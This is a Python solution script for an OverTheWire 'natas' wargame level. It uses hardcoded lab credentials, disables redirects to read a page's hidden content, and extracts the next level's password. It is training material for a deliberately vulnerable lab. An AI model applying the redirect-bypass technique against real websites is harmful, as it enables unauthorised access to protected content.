from pwn import *
import requests
import re
import codecs       #This is just to decode a string to hex

username = "natas22"
password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
url = "http://{}.natas.labs.overthewire.org".format(username)
expermentor = "http://natas21-experimenter.natas.labs.overthewire.org/"

log.progress("Getting the natas23 password, Hold on! ")
session = requests.session()

web = session.get(url + "/?revelio=1", auth = (username, password), allow_redirects = False).text
flag = re.findall("Password: (.*)</pre>", web)
print("The password for natas23 is === " + flag[0])